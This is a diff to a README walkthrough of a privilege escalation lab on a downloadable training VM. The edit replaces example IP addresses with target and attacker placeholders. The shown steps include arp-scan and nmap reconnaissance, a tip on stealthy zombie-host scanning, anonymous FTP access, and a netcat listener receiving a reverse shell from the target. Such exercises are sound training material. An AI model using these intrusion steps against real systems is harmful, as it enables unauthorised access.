@@ -7,7 +7,7 @@ This README outlines the steps taken to complete a privilege escalation exercise
 
 You can dowload the vm [here](https://assets.01-edu.org/cybersecurity/local/01-Local.ova).
 
-####  Warning: All the ip used here are for example purpose don't forget to adapt yours.
+####  Warning: If you see ip, all ip used here are for example purpose place your ip in [attacker_ip] and [target_ip].
 
 ## Initial Setup and Discovery
 
@@ -28,14 +28,14 @@ sudo arp-scan -l | grep 08:00:27:7c:16:75
 Result:
 
 ```sh
-172.16.1.255  08:00:27:7c:16:75  PCS Systemtechnik GmbH
+[target_ip]  08:00:27:7c:16:75  PCS Systemtechnik GmbH
 ```
 
 3. ### Check for Open Ports:
 
 First, check if ports are filtered by using the `-sA` scan option:
 ```sh
-nmap -sA 172.16.1.255
+nmap -sA [target_ip]
 ```
 
 This scan shows whether ports are filtered or unfiltered by the firewall. If the ports are not filtered, it indicates no firewall is handling port traffic.
@@ -43,7 +43,7 @@ This scan shows whether ports are filtered or unfiltered by the firewall. If the
 For a more discreet scan, you could use the `-sI` scan option, which uses a zombie host to make the scan harder to trace. However, for this exercise, we will use the `-sS` (TCP SYN) scan:
 
 ```sh
-sudo nmap -sS 172.16.1.255
+sudo nmap -sS [target_ip]
 ```
 
 The TCP SYN scan, also known as a "half-open" scan, is stealthier as it does not complete the TCP handshake.
@@ -61,7 +61,7 @@ PORT   STATE SERVICE
 
 I used to check all the access type and found out this one:
 ```sh
-nmap -p 21 --script=ftp-anon 172.16.1.255
+nmap -p 21 --script=ftp-anon [target_ip]
 ```
 Result:
 
@@ -73,7 +73,7 @@ Anonymous FTP login allowed (FTP code 230)
 
 1. #### Connect to FTP as Anonymous:
 ```sh
-ftp 172.16.1.255
+ftp [target_ip]
 ```
 
 Use the anonymous username and no password.
@@ -103,7 +103,7 @@ When the connection is set up properly you shoud get something like this:
 ```sh
 └─$ nc -lvnp 1234                           
 listening on [any] 1234 ...
-connect to [172.16.2.135] from (UNKNOWN) [172.16.1.255] 60774
+connect to [attacker_ip] from (UNKNOWN)[target_ip] 60774
 Linux ubuntu 4.4.0-194-generic #226-Ubuntu SMP Wed Oct 21 10:19:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  10:10:29 up 21 min,  0 users,  load average: 0.09, 0.03, 0.01
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
